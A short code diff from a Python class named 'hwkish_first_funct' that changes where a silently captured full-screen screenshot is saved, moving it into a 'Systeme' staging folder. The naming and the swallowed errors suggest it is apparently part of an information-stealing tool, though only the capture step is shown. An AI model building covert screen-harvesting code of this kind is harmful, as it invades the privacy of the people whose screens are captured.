@@ -1768,7 +1768,7 @@ class hwkish_first_funct(Functions):
            screen_width = win32api.GetSystemMetrics(0)
            screen_height = win32api.GetSystemMetrics(1)
            image = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))
-           image.save("Screenshot.png")
+           image.save(self.dir + f"\\Systeme\\Screenshot.png")
         except Exception as e:
             pass
         
